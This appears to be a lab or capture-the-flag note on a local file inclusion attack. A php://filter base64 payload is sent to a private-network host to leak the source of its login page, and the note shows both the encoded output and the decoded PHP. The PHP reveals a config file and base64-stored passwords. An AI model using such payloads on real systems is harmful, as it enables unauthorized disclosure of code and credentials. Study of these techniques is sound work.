LFI:
http://192.168.92.136/?page=php://filter/convert.base64-encode/resource=login

Result:
PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEFORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==

Decoded:

<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
	$luser = $_POST['user'];
	$lpass = base64_encode($_POST['pass']);

	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
	$stmt->bind_param('ss', $luser, $lpass);

	$stmt->execute();
	$stmt->store_Result();

	if ($stmt->num_rows == 1)
	{
		$_SESSION['user'] = $luser;
		header('Location: ?page=upload');
	}
	else
	{
		echo "Login failed.";
	}
}
else
{
	?>
	<form action="" method="POST">
	<label>Username: </label><input id="user" type="test" name="user"><br />
	<label>Password: </label><input id="pass" type="password" name="pass"><br />
	<input type="submit" name="submit" value="Login">
	</form>
	<?php
}